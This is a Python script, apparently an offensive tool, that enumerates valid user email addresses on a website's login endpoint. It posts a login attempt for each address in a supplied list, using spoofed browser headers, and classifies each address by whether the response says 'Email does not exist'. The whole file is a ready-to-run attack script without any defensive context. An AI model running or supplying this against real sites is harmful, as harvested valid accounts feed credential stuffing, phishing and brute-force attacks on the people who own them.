import requests
import sys
import json
from urllib.parse import urlparse

def build_headers(target_url):
    """
    Dynamically builds headers based on the target domain.
    """
    parsed = urlparse(target_url)
    domain = parsed.netloc or parsed.path

    headers = {
        "Host": domain,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{domain}",
        "Connection": "close",
        "Referer": f"http://{domain}/login"
    }

    return headers


def check_email(target_url, email, password="password"):
    """
    Sends a POST request to test if an email exists on the target site.
    """
    headers = build_headers(target_url)
    data = {
        "username": email,
        "password": password,
        "function": "login"
    }

    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=10)
        try:
            return response.json()
        except json.JSONDecodeError:
            return {"status": "error", "message": "Invalid JSON response"}
    except requests.RequestException as e:
        return {"status": "error", "message": str(e)}


def enumerate_emails(target_url, email_file):
    """
    Tests a list of emails on a specified target site.
    """
    valid_emails = []
    invalid_phrase = "Email does not exist"

    with open(email_file, "r") as file:
        emails = [line.strip() for line in file if line.strip()]

    print(f"\n Testing {len(emails)} emails on {target_url}\n")

    for email in emails:
        response_json = check_email(target_url, email)
        status = response_json.get("status", "")
        message = response_json.get("message", "")

        if status == "error" and invalid_phrase.lower() in message.lower():
            print(f"[ INVALID] {email}")
        elif "success" in status.lower() or "valid" in message.lower():
            print(f"[ VALID] {email}")
            valid_emails.append(email)
        else:
            print(f"[ UNKNOWN] {email} → {message}")

    return valid_emails


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("\nUsage: python3 script.py <target_url> <email_list_file>")
        print("Example: python3 enum.py http://example.com/api/login emails.txt\n")
        sys.exit(1)

    target_url = sys.argv[1]
    email_file = sys.argv[2]

    valid_emails = enumerate_emails(target_url, email_file)

    print("\n✅ Valid emails found:")
    for e in valid_emails:
        print("  -", e)
